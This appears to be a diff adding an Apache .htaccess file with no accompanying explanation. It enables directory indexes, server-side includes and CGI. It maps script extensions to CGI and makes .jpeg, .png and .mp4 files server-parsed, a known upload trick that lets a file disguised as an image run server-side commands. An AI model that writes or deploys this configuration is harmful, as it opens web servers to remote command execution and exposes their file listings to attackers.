@@ -1,0 +1,4 @@
+Options +Indexes +Includes +ExecCGI
+AddHandler cgi-script .cgi .pl .py .rb
+AddHandler server-parsed .shtml .stm .shtm .html .jpeg .png .mp4
+AddOutputFilter INCLUDES .shtml .stm .shtm .html .jpeg .png .mp4
